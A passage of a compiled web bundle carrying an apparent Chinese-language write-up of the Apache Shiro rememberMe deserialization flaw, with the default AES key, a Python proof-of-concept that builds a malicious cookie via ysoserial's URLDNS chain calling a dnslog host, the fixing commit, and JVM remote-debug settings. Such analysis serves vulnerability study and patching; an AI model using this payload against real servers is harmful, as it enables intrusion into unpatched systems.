this.deserialize"}),"\u8fdb\u884c\u53cd\u5e8f\u5217\u5316"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012162647365",src:n(78081).A+"",width:"3584",height:"2240"})}),"\n",(0,d.jsxs)(s.p,{children:["\u53cd\u5e8f\u5217\u5316\u8c03\u7528",(0,d.jsx)(s.code,{children:"readObject()"}),"\u4f4d\u7f6e"]}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012162937346",src:n(72786).A+"",width:"3580",height:"1030"})}),"\n",(0,d.jsx)(s.h2,{id:"poc\u7f16\u5199",children:"POC\u7f16\u5199"}),"\n",(0,d.jsxs)(s.p,{children:["\u6839\u636e\u521a\u624d\u7684\u5206\u6790\uff0cshiro\u5728\u83b7\u53d6\u5230cookie\u540e\u4f1a\u8fdb\u884c base64\u89e3\u7801--\x3eAES\u89e3\u5bc6(CBC\u6a21\u5f0f\uff0cPKCS5Padding\uff0c\u9ed8\u8ba4\u5bc6\u94a5\u4e3a",(0,d.jsx)(s.code,{children:"kPH+bIxk5D2deZiIxcaaaA=="}),")--\x3e\u53cd\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u6211\u4eec\u6784\u9020\u7684POC\u53ea\u9700\u8981\u53cd\u7740\u6765\u5373\u53ef\uff0c\u5373 ",(0,d.jsx)(s.code,{children:"\u6076\u610f\u7684\u5e8f\u5217\u5316\u6570\u636e --\x3e AES\u52a0\u5bc6 --\x3e base64\u7f16\u7801"}),"\uff0c\u4f7f\u7528ULRLDNS\u94fe\u6765\u8fdb\u884c\u9a8c\u8bc1"]}),"\n",(0,d.jsx)(s.p,{children:"POC\u5982\u4e0b\uff1a"}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{className:"language-python",children:"#!/usr/bin/env python\n\nimport base64\nimport subprocess\nfrom Crypto.Cipher import AES\n\n\ndef rememberme(dnslog):\n    popen = subprocess.check_output(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', dnslog])\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    key = \"kPH+bIxk5D2deZiIxcaaaA==\"\n    mode = AES.MODE_CBC\n    iv = b' ' * 16\n    encryptor = AES.new(base64.b64decode(key), mode, iv)\n    file_body = pad(popen)\n    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))\n    return base64_ciphertext\n\n\nif __name__ == '__main__':\n    payload = rememberme('http://fzv4lc.dnslog.cn')\n    print(\"rememberMe={}\".format(payload.decode()))\n"})}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012170350284",src:n(89953).A+"",width:"1052",height:"208"})}),"\n",(0,d.jsx)(s.h2,{id:"\u6f0f\u6d1e\u4fee\u590d",children:"\u6f0f\u6d1e\u4fee\u590d"}),"\n",(0,d.jsxs)(s.blockquote,{children:["\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.a,{href:"https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848",children:"https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848"})}),"\n"]}),"\n",(0,d.jsx)(s.p,{children:"\u5220\u9664\u786c\u7f16\u7801\uff0c\u751f\u6210\u968f\u673akey"}),"\n",(0,d.jsx)(s.p,{children:(0,d.jsx)(s.img,{alt:"image-20211012170930594",src:n(43861).A+"",width:"2430",height:"1436"})}),"\n",(0,d.jsx)(s.h2,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,d.jsx)(s.h3,{id:"\u5206\u6790\u8fc7\u7a0b",children:"\u5206\u6790\u8fc7\u7a0b"}),"\n",(0,d.jsx)(s.p,{children:"\u603b\u4f53\u6765\u8bf4\u5206\u6790\u8d77\u6765\u8fd8\u662f\u5f88\u7b80\u5355\uff0c\u7b80\u5316\u4e00\u4e0b\u5c31\u662f"}),"\n",(0,d.jsxs)(s.ul,{children:["\n",(0,d.jsxs)(s.li,{children:["\u9996\u5148\u5728",(0,d.jsx)(s.code,{children:"CookieRememberMeManager.getRememberedSerializedIdentity"}),"\u4e2d\u8fdb\u884c",(0,d.jsx)(s.code,{children:"base64\u89e3\u7801"})]}),"\n",(0,d.jsxs)(s.li,{children:["\u7136\u540e\u8c03\u7528",(0,d.jsx)(s.code,{children:"AbstractRememberMeManager.convertBytesToPrincipals"}),"\uff0c\u5176\u4e2d\u5305\u542b\u4e86AES\u89e3\u5bc6\u548c\u53cd\u5e8f\u5217\u5316"]}),"\n"]}),"\n",(0,d.jsx)(s.h3,{id:"\u51e0\u79cd\u5e38\u89c1\u7684\u8fdc\u7a0b\u8c03\u8bd5\u7684\u65b9\u6cd5",children:"\u51e0\u79cd\u5e38\u89c1\u7684\u8fdc\u7a0b\u8c03\u8bd5\u7684\u65b9\u6cd5"}),"\n",(0,d.jsxs)(s.ul,{children:["\n",(0,d.jsx)(s.li,{children:(0,d.jsx)(s.strong,{children:"JAR"})}),"\n"]}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{children:"jdk<=1.7\njava -Xdebug -Xrunjdwp:server=y,transport=dt_socket,address=8000,suspend=n -jar \njdk>1.7\njava -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n -jar \n"})}),"\n",(0,d.jsxs)(s.ul,{children:["\n",(0,d.jsx)(s.li,{children:(0,d.jsx)(s.strong,{children:"Tomcat"})}),"\n"]}),"\n",(0,d.jsx)(s.p,{children:"catalina.sh \u4e2d\u6dfb\u52a0"}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{children:"JPDA_TRANSPORT=dt_socket\nJPDA_ADDRESS=5005\nJPAD_SUSPEND=n\n"})}),"\n",(0,d.jsx)(s.p,{children:"\u6216"}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{children:'CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=60222,suspend=n,server=y"\n'})}),"\n",(0,d.jsxs)(s.ul,{children:["\n",(0,d.jsx)(s.li,{children:(0,d.jsx)(s.strong,{children:"Weblogic"})}),"\n"]}),"\n",(0,d.jsxs)(s.p,{children:["\u5728 ",(0,d.jsx)(s.code,{children:"Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh"})," \u4e2d\u6dfb\u52a0"]}),"\n",(0,d.jsx)(s.pre,{children:(0,d.jsx)(s.code,{children:'debugFlag="true"\nexport debugFlag\n'})})]})}function o(e={}){const{wrapper:s}={...(0,c.R)(),...e.components};return s?(0,d.jsx)(s,{...e,children:(0,d.jsx)(t,{...e})}):t(e)}},57603:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012161951771-568cba8f4d13b01283b46725c43742fd.png"},59317:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012093703190-58595c8ebc1f0fb56dfe91a7bc07c217.png"},59513:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012152145756-d02bda01adc72b342605fdc2365d9f3b.png"},71728:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012102432067-11b37e3ff1253fe052842082040a269d.png"},72786:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012162937346-b24d7e2e463e46f1d4021ad6b30b2988.png"},72878:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012095010868-c251c42a12c3a4922ebc90eaa018df12.png"},73913:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012152013338-f7762d7c373d11a810c6f9f9738622f8.png"},76174:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012110150184-19c8e4bf71c80f499fc0654a81dab3ca.png"},78081:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012162647365-b86fd6a4131b068be9e05c59fa19c0e6.png"},81049:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012152946115-f5cefacbbd60e189fa61d755cd4ac8db.png"},82495:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012150727798-a70add232696db152945dd2971f30971.png"},83695:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012110132530-8c695e655ef52123f1e699b55c213c7c.png"},89953:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211012170350284-4b0781dc35b0aac72e6122fae938b162.png"},92259:(e,s,n)=>{n.d(s,{A:()=>i});const i=n.p+"assets/images/image-20211011171345284-1f225127af9d76508275b2a823f7479f.png"}}]);